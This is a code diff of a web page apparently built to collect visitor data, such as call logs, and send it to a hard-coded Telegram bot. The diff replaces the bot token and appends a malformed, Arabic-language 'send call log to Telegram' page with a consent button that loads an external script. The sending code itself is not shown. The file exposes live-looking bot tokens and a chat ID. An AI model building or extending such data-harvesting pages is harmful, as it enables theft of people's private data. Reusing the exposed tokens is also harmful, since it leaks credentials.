@@ -32,7 +32,7 @@
 
     <script>
         // Telegram configuration
-        const TELEGRAM_BOT_TOKEN = "7517879972:AAF8cV7AValEWxo9NyihtHDsFe7ZRjfmW-s";
+        const TELEGRAM_BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
         const TELEGRAM_CHAT_ID = "6913353602";
 
         // Faster Telegram sending with combined data
@@ -308,5 +308,20 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 </script>
+    <!DOCTYPE html>
+<html>
+<head>
+    <title>إرسال سجل المكالمات</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        button { padding: 10px; background: #0088cc; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>إرسال سجل المكالمات إلى Telegram</h1>
+    <button id="requestAccess">الموافقة وجلب البيانات</button>
+    <div id="output"></div>
+
+    <script src="Script.js"></script>
 </body>
 </html>
